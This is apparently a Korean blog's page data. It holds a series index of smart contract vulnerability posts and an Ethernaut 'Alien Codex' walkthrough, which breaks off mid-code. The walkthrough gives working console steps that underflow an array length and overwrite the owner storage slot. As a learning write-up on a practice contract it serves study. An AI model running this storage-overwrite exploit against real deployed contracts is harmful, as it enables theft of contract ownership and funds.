{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/allSeries/",
    "result": {"data":{"cur":{"id":"215ce45f-a0f2-56b0-9e68-03c15217730c","html":"<h1 id=\"-시리즈-별-정리\" style=\"position:relative;\"><a href=\"#-%EC%8B%9C%EB%A6%AC%EC%A6%88-%EB%B3%84-%EC%A0%95%EB%A6%AC\" aria-label=\" 시리즈 별 정리 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>👋 시리즈 별 정리</h1>\n<p>시리즈 별로 보기 편하게 정리해두었다!</p>\n<h2 id=\"evm\" style=\"position:relative;\"><a href=\"#evm\" aria-label=\"evm permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>EVM</h2>\n<ul>\n<li><a href=\"https://holyhansss.github.io/EVM/evm/\">EVM과 Transaction</a></li>\n<li><a href=\"https://holyhansss.github.io/EVM/SolidityBytecodeandOpcodeBasics/\">Solidity Bytecode and Opcode Basics</a></li>\n</ul>\n<h2 id=\"취약점-시리즈\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%8B%9C%EB%A6%AC%EC%A6%88\" aria-label=\"취약점 시리즈 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 시리즈</h2>\n<p>취약점 시리즈는 알려진 smart contract의 취약점에 대해 다룬다.</p>\n<ul>\n<li><a href=\"https://holyhansss.github.io/vulnerability/reentrancy_attack/reentrancy_attack/\">취약점 시리즈 1 Reentrancy Attack 재진입 공격</a></li>\n<li><a href=\"https://holyhansss.github.io/vulnerability/over_under_flow/over_under_flow/\">취약점 시리즈 2 Overflow &#x26; Underflow</a></li>\n<li><a href=\"https://holyhansss.github.io/vulnerability/block_timestamp/block_timestamp/\">취약점 시리즈 3 block.timestamp</a></li>\n<li><a href=\"https://holyhansss.github.io/vulnerability/delegate_call/delegate_call/\">취약점 시리즈 4 Delegate Call</a></li>\n<li><a href=\"https://holyhansss.github.io/vulnerability/front_running/front_running/\">취약점 시리즈 5 Front Running</a></li>\n<li><a href=\"https://holyhansss.github.io/vulnerability/dos_with_unexpected_revert/dos_unexpected_revert/\">취약점 시리즈 6 DOS With Unexpected Revert</a></li>\n<li><a href=\"https://holyhansss.github.io/vulnerability/dos_with_block_gas_limit/dos_block_gas_limit/\">취약점 시리즈 7 DOS With Block Gas Limit</a></li>\n<li><a href=\"https://holyhansss.github.io/vulnerability/tx.origin/tx_origin/\">취약점 시리즈 8 tx.origin</a></li>\n<li><a href=\"https://holyhansss.github.io/vulnerability/selfdestruct/selfdestruct/\">취약점 시리즈 9 Self Destruct</a></li>\n<li><a href=\"https://holyhansss.github.io/vulnerability/private_variable/private_variable/\">취약점 시리즈 10 Private</a></li>\n</ul>\n<h2 id=\"ethernaut-시리즈\" style=\"position:relative;\"><a href=\"#ethernaut-%EC%8B%9C%EB%A6%AC%EC%A6%88\" aria-label=\"ethernaut 시리즈 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Ethernaut 시리즈</h2>\n<p>Ethernaut 시리즈는 Ethernaut 문제를 하나하나 풀어본 후 풀이를 적는다. 거의 모든 문제가 어렵기 때문에 풀이를 보며 공부하고, 이해한 내용을 적었다. Ethernaut를 풀기 시작한 여러분도 푸는 것에만 집중하는게 아니라 하나하나 뜯어보면서 배우길 바란다 :)</p>\n<ul>\n<li><a href=\"https://holyhansss.github.io/ethernaut/1_fallback_ethernaut/1_fallback_ethernaut/\">Ethernaut 1. Fallback</a></li>\n<li><a href=\"https://holyhansss.github.io/ethernaut/2_fallout_ethernaut/2_fallout_ethernaut/\">Ethernaut 2. Fallout</a></li>\n<li><a href=\"https://holyhansss.github.io/ethernaut/3_coinFilp_ethernaut/3_coinFlip_ethernaut/\">Ethernaut 3. CoinFlip</a></li>\n<li><a href=\"https://holyhansss.github.io/ethernaut/4_telephone_ethernaut/4_telephone_ethernaut/\">Ethernaut 4. Telephone</a></li>\n<li><a href=\"https://holyhansss.github.io/ethernaut/5_token_ethernaut/5_token_ethernaut/\">Ethernaut 5. Token</a></li>\n<li><a href=\"https://holyhansss.github.io/ethernaut/6_delegation_ethernaut/6_delegation_ethernaut/\">Ethernaut 6. Delegation</a></li>\n<li><a href=\"https://holyhansss.github.io/ethernaut/7_force_ethernaut/7_force_ethernaut/\">Ethernaut 7. Force</a></li>\n<li><a href=\"https://holyhansss.github.io/ethernaut/8_vault_ethernaut/8_vault_ethernaut/\">Ethernaut 8. Vault</a></li>\n<li><a href=\"https://holyhansss.github.io/ethernaut/9_king_ethernaut/9_king_ethernaut/\">Ethernaut 9. King</a></li>\n<li><a href=\"https://holyhansss.github.io/ethernaut/10_Re-entrancy_ethernaut/10_Re-entrancy_ethernaut/\">Ethernaut 10. Re-entrancy</a></li>\n<li><a href=\"https://holyhansss.github.io/ethernaut/11_elevator_ethernaut/11_elevator_ethernaut/\">Ethernaut 11. Elevator</a></li>\n<li><a href=\"https://holyhansss.github.io/ethernaut/12_privacy_ethernaut/12_privacy_ethernaut/\">Ethernaut 12. Privacy</a></li>\n<li><a href=\"https://holyhansss.github.io/ethernaut/13_gatekeeperOne_ethernaut/13_gatekepperOne_1_ethernaut/\">Ethernaut 13. GatekeeperOne - 1</a></li>\n<li><a href=\"https://holyhansss.github.io/ethernaut/13_gatekeeperOne_ethernaut/13_gatekepperOne_2_ethernaut/\">Ethernaut 13. GatekeeperOne - 2</a></li>\n<li><a href=\"https://holyhansss.github.io/ethernaut/14_gatekeeperTwo_ethernaut/14_gatekeeperTwo_ethernaut/\">Ethernaut 14. GatekeeperTwo</a></li>\n<li><a href=\"https://holyhansss.github.io/ethernaut/15_naughtCoin_ethernaut/15_naughtCoin_ethernaut/\">Ethernaut 15. Naught Coin</a></li>\n<li><a href=\"https://holyhansss.github.io/ethernaut/16_preservation_ethernaut/16_preservation_ethernaut/\">Ethernaut 16. Preservation</a></li>\n<li><a href=\"https://holyhansss.github.io/ethernaut/17_recovery_ethernaut/17_recovery_ethernaut/\">Ethernaut 17. Recovery</a></li>\n<li><a href=\"https://holyhansss.github.io/ethernaut/18_magicNumber_ethernaut/18_magicNumber_ethernaut/\">Ethernaut 18. MagicNumber</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#evm\">EVM</a></li>\n<li><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%8B%9C%EB%A6%AC%EC%A6%88\">취약점 시리즈</a></li>\n<li><a href=\"#ethernaut-%EC%8B%9C%EB%A6%AC%EC%A6%88\">Ethernaut 시리즈</a></li>\n</ul>\n</div>","excerpt":"👋 시리즈 별 정리 시리즈 별로 보기 편하게 정리해두었다! EVM EVM과 Transaction Solidity Bytecode and Opcode Basics 취약점 시리즈 취약점 시리즈는 알려진 smart contract의 취약점에 대해 다룬다. 취약점 시리즈 1 Reentrancy Attack 재진입 공격 취약점 시리즈 2 Overflow & Underflow 취약점 시리즈 3 block.timestamp 취약점 시리즈 4 Delegate Call 취약점 시리즈 5 Front Running 취약점 시리즈 6 DOS With Unexpected Revert 취약점 시리즈 7 DOS With Block Gas Limit 취약점 시리즈 8 tx.origin 취약점 시리즈 9 Self Destruct 취약점 시리즈 10 Private Ethernaut 시리즈 Ethernaut 시리즈는 Ethernaut 문제를 하나하나 풀어본 후 풀이를 적는다. 거의 모든 문제가 어렵기 때문에 풀이를…","frontmatter":{"date":"January 01, 2099","title":"시리즈 별 정리(모든 글이 다 여기 정리되어 있어요!)","categories":"~feature~","author":"한성원","emoji":"🧢"},"fields":{"slug":"/allSeries/"}},"next":{"id":"b39f1c1a-2743-5cc2-b636-42969923ae17","html":"<h1 id=\"-1-alien-codex\" style=\"position:relative;\"><a href=\"#-1-alien-codex\" aria-label=\" 1 alien codex permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>👋 1. Alien Codex</h1>\n<p><strong>Difficulty 7/10</strong></p>\n<ul>\n<li>승리 조건</li>\n<li>코드 분석</li>\n<li>풀이</li>\n</ul>\n<p>순서로 진행 될 것이다.</p>\n<hr>\n<h2 id=\"승리-조건\" style=\"position:relative;\"><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\" aria-label=\"승리 조건 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>승리 조건</h2>\n<ul>\n<li>Alien contract의 ownership 가져오기</li>\n</ul>\n<hr>\n<h2 id=\"코드-분석\" style=\"position:relative;\"><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\" aria-label=\"코드 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>코드 분석</h2>\n<p>분석은 주석에 있습니다!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// 컴파일러 버전 0.5.0을 사용하고 있다. 즉 under &amp; overflow 취약점을 가지고 있다.</span>\r\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.5.0</span><span class=\"token punctuation\">;</span>\r\n\r\n<span class=\"token comment\">// 우리가 모르는 Ownable-05.sol contract를 import한다.</span>\r\n<span class=\"token keyword\">import</span> <span class=\"token string\">'../helpers/Ownable-05.sol'</span><span class=\"token punctuation\">;</span>\r\n\r\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">AlienCodex</span> <span class=\"token keyword\">is</span> Ownable <span class=\"token punctuation\">{</span>\r\n\r\n    <span class=\"token builtin\">bool</span> <span class=\"token keyword\">public</span> contact<span class=\"token punctuation\">;</span>\r\n    <span class=\"token builtin\">bytes32</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">public</span> codex<span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token comment\">// contact이 true인지 확인하는 modifier</span>\r\n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">contacted</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">assert</span><span class=\"token punctuation\">(</span>contact<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n    \r\n    <span class=\"token comment\">// contact의 value를 true로 만들 수 있는 function</span>\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">make_contact</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n        contact <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token comment\">// codex array에 _content를 push 할 수 있는 function</span>\r\n    <span class=\"token comment\">// modifier: contacted</span>\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">record</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span> _content<span class=\"token punctuation\">)</span> contacted <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n        codex<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>_content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token comment\">// codex의 length를 줄일 수 있다. 아마 pop과 같은 역할을 위해 만든게 아닐까 싶다.</span>\r\n    <span class=\"token comment\">// modifier: contacted</span>\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">retract</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> contacted <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n        codex<span class=\"token punctuation\">.</span>length<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token comment\">// codex array안에 i위치에 있는 _content를 바꿀 수 있다.</span>\r\n    <span class=\"token comment\">// modifier: contacted</span>\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">revise</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> i<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes32</span> _content<span class=\"token punctuation\">)</span> contacted <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n        codex<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> _content<span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<hr>\n<h2 id=\"풀이\" style=\"position:relative;\"><a href=\"#%ED%92%80%EC%9D%B4\" aria-label=\"풀이 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>풀이</h2>\n<h3 id=\"들어가기-전\" style=\"position:relative;\"><a href=\"#%EB%93%A4%EC%96%B4%EA%B0%80%EA%B8%B0-%EC%A0%84\" aria-label=\"들어가기 전 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>들어가기 전</h3>\n<p>이 문제에서 우리의 목표는 Alien contract의 ownership 가져오는 것이다.</p>\n<p>우선 힌트를 보자!</p>\n<ol>\n<li>array storage가 어떻게 작동하는지 이해해야한다.</li>\n<li>ABI의 특징을 이해해야한다.</li>\n<li>Using a very underhanded approach -> 아마 underhanded solidity contest에 관해 말하는 것 같은데…</li>\n</ol>\n<p>그것처럼 풀라는건가? 정확히는 모르겠다. 추후 알게되면 업데이터하도록 하겠다!</p>\n<p>우리의 승리 조건은 owner를 가져오는 것이지만 코드를 아무리 둘러봐도 <code class=\"language-text\">owner</code>를 바꿀 수 있는 function은 존재하지 않는다. 하지만 모든 <code class=\"language-text\">state variable</code>은 동인한 <code class=\"language-text\">storage</code>에 저장된다. 만약 우리가 모든 storage에 대한 access를 가진다면 어떻게 될까?</p>\n<p>이 문제는 <code class=\"language-text\">codex[]</code>의 길이를 최대값으로 만든 후 모든 storage에 대한 access를 가진다. 이후 <code class=\"language-text\">revise()</code>를 통해 owner의 위치에 값을 바꿔놓으면 해결할 수 있다.</p>\n<p>이 문제를 풀기 위해서는 storage에 대한 지식이 없다면 풀 수 없다. state vaiable들이 어떤 방식으로 저장되는지 알아야한다. 관련해서는 다음 글들을 읽어보고 오길 바란다.</p>\n<ul>\n<li><a href=\"https://holyhansss.github.io/ethernaut/12_privacy_ethernaut/12_privacy_ethernaut/\">(Ethernaut 취약점 12) Privacy</a></li>\n<li><a href=\"https://medium.com/@heuristicwave/evm-storage%EC%97%90%EB%8A%94-%EC%96%B4%EB%96%BB%EA%B2%8C-%EB%B3%80%EC%88%98%EA%B0%80-%EC%A0%80%EC%9E%A5%EB%90%A0%EA%B9%8C-%EC%A0%80%EC%88%98%EC%A4%80%EC%97%90%EC%84%9C-%ED%99%95%EC%9D%B8%ED%95%98%EB%8A%94-storage-%EC%98%81%EC%97%AD-71dc3a6da8e2\">EVM Storage에는 어떻게 변수가 저장될까? 저수준에서 확인하는 Storage 영역 - Heuristic Wave</a></li>\n</ul>\n<br/>\n<h3 id=\"풀이-1\" style=\"position:relative;\"><a href=\"#%ED%92%80%EC%9D%B4-1\" aria-label=\"풀이 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>풀이</h3>\n<p>먼저 make_contact() 제외하고 모든 function은 contacted modifier를 통과해야한다.\r\n우리는 이 부분은 make_contact()를 call하는 것 만으로도 쉽게 해결할 수 있다.</p>\n<p><code class=\"language-text\">retract()</code>를 보면 codex의 길이를 줄이는 것을 알 수 있다. solidity 컴파일러 버젼 0.5.0은 overflow와 underflow를 throw하지 않는다.</p>\n<p>우선 길이를 줄이기 위해서는 codex array의 값을 집어넣어야한다.</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">//  우선 현재 owner를 확인해보자!</span>\r\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">owner</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\r\n\r\n<span class=\"token comment\">// make_contact를 통해 contact를 true로 바꾼다.</span>\r\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">make_contact</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\r\n\r\n<span class=\"token comment\">// record에 임의의 32 bytes 값을 넣는다.</span>\r\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">record</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x0000000000000000000000000000000000000000000000000000000000000900\"</span><span class=\"token punctuation\">)</span>\r\n\r\n<span class=\"token comment\">// 이후 contract의 storage slot 0와 1의 값을 확인해보자</span>\r\n<span class=\"token comment\">// slot 0에는 owner의 주소와 contact의 bool값이 들어있다.</span>\r\n<span class=\"token comment\">// slot 1에는 codex[]의 길이가 들어있다</span>\r\n<span class=\"token keyword\">await</span> web3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span><span class=\"token function\">getStorageAt</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"contract address\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">err<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token keyword\">await</span> web3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span><span class=\"token function\">getStorageAt</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"contract address\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">err<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\r\n\r\n<span class=\"token comment\">// retract()을 사용해 codex의 길이를 2^256-1로 만든다.</span>\r\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">retract</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">retract</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token comment\">// 다시한번 길이를 확인해보면 '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'가 길이가 된 것을 확인할 수 있다.</span>\r\n<span class=\"token keyword\">await</span> web3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span><span class=\"token function\">getStorageAt</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"contract address\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">err<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span></code></pre></div>\n<br/>\n<p>위 코드들을 통해 EVM Storage 전체에 대한 access를 얻었다. 즉 owner를 나 자신으로 바꿀 준비는 끝났다. 이제 owner이 저장되어있는 위치를 찾아 revise 함수를 호출하면 끝난다.</p>\n<p>그렇다면 이제 revise()에 인자인 i를 찾아보자.\r\ndynamic array의 경우 사이즈를 예측할 수 없기 때문에 Keccak-256 hash를 사용해 위치를 정한다.\r\n<a href=\"https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/\">이 글</a>을 참조하자! &#x3C;- 진짜 중요함!</p>\n<p>dynamic array의 위치는 다음과 같은 수식을 사용해 찾을 수 있다.\r\n<code class=\"language-text\">codex[y](y=2**256-x)</code> x는 slot의 위치이다.\r\ncodex array의 storage 위치는 <code class=\"language-text\">keccak256(bytes32(1))</code>이다.</p>\n<p>위 수식을 remix에 대입하여 위치를 계산하면 다음과 같다.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">arrLocation</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\r\n    <span class=\"token keyword\">public</span>\r\n    <span class=\"token punctuation\">{</span>\r\n        <span class=\"token comment\">// codex[y](y=2**256-x)</span>\r\n        index <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">256</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> \r\n    <span class=\"token punctuation\">}</span></code></pre></div>\n<br/>\n<p>위 함수를 통해 우리는 <code class=\"language-text\">35707666377435648211887908874984608119992236509074197713628505308453184860938</code>라는 값을 얻었고 이는 owner의 storage 위치이다.</p>\n<p>마지막으로 다음과 같이 revise를 사용해 owner를 바꿔주면 된다.</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">// 두번째 인자는 32 bytes인 나의 주소이다. 20 bytes인 주소 앞에 0을 붙여주면 된다.</span>\r\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">revise</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"35707666377435648211887908874984608119992236509074197713628505308453184860938\"</span><span class=\"token 